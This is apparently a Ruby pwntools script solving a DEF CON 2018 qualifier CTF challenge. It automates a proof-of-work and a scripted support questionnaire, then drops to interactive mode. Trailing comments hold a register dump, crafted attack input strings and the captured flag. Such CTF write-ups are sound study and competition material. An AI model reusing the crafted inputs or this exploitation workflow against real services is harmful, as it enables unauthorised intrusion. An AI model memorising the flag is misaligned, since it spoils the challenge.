#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'        # https://github.com/peter50216/pwntools-ruby

host, port = '02528625.quals2018.oooverflow.io', 9009
@local = false
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
# context.arch = 'amd64' 
# context.log_level = :debug

def pow
  z.gets 'Challenge: '
  chal = z.gets.strip
  z.gets 'n: '
  n = z.gets.strip
  ans = `python ../solve_pow.py #{chal} #{n}`.scan(/(\d+)/).flatten.first.to_i
  z.puts ans
end

def question
  z.gets "how can I help you?\n"
  z.puts 'He'
  tbl = {
    'Can it just be... you?' => 'no',
    'Can the problem just be a consequence of the angle at which you are looking at your monitor?' => 'no',
    'Did you even try to reboot your computer before calling us?' => 'yes',
    'Did you experience similar problems with other software as well?' => 'no',
    'Did you try assuming a Yoga pose when starting the program?' => 'yes',
    'Does the problem with our software only happen in the morning?' => 'no',
    'Have you tried to vigorously press CTRL-C?' => 'yes',
    'I heard sometimes bugs are caused by the presence of floppy drives. Do you have one?' => 'no',
    'If we wait long enough, do you think the problem will just disappear?' => 'no',
    'It has been a tiring afternoon. Could we just stop here and call it a day?' => 'no',
    'Our software does not work on the Nintendo Wii. Are you using one at the moment?' => 'no',
    'You have a valid license for our software, do you?' => 'yes',
    'mmm.. Did you ask Google about it?' => 'yes',
    'Is your keyboard properly connected to the computer?' => 'yes',
    'Does the program persists when you are not looking at it?' => 'yes',
    'Can it be an electromagnetic radiation in your room?' => 'no',
    'Do you regularly clean the mouse pad?' => 'yes',
    'What about the mouse?' => 'Yes',
    'Maybe it is some sort of millennium bug. Can you try to temporarily change the date on your computer?' => 'No',
    'Can you please unplug your computer and then plug it again?' => 'Yes',

    "Alright then - it looks like we ruled out the most common problems.\nSo, let me now look at the program for you.\nI am going to use port 3456. Everything ready on your side?" => 'yes'
  }
  loop do
    s = z.gets('? ').strip
    (p s;break) if tbl[s].nil?
    z.gets('? ') if tbl[s].downcase != tbl[s]
    z.puts tbl[s]
    break if s.start_with?('Alright then')
  end
end

(pow; question) unless @local

z.interact
# ------------------------------------------------------------------------------
# REG              OUR SERVER                          YOUR INSTALLATION
# ------------------------------------------------------------------------------
# rbp | 0x7fffffffe9e0 > 0x00007fffffffebc0 | 0x7fffffffe1a0 > 0x00007fffffffe458
# r13 | 0x7fffffffeca0 > 0x0000000000000002 | 0x7fffffffe460 > 0x00007fffffffe6e3
# rax | 0x0000fa4eba60                      | 0x0000b096bff4
# rdx | 0x0000ffffffff                      | 0x000068cbc732
# rsp | 0x7fffffffe9b0 > 0x0000000000000000 | 0x7fffffffe160 > 0x0000000000000000
# r10 | 0x000000000000                      | 0x00000000046c
# r8 | 0x000000000010                      | 0x7ffff7ff3700
# rsi | 0x000000000001                      | 0x0000006033d0
# r11 | 0x000000000000                      | 0x7ffff7b5aea0
# rdi | 0x7fffffffea20 > 0x0000000000000000 | 0x7fffffffe100 > 0x0000000000000000
#  r9 | 0x00000000001c                      | 0x000000000001
# rcx | 0x0000006033d8 > 0x31345e3339252565 | 0x000000000015

# Bi14Po5At9Rn2Fm999Es999Cf999Bk999Cm999Pu999Am999U999Np999Th999Pa999Ac999Ra999Fr999Rn999At999Po999Bi999Tl456Sb4TiH353
# At8Pa16Th4Fm999Es999Cf999Bk999Cm999Pu999Am999U999Np999Th999Pa999Ac999Ra999Fr999Rn999At999Po999Bi999Tl456Sb4TiH353
# flag: %%license%%93^41
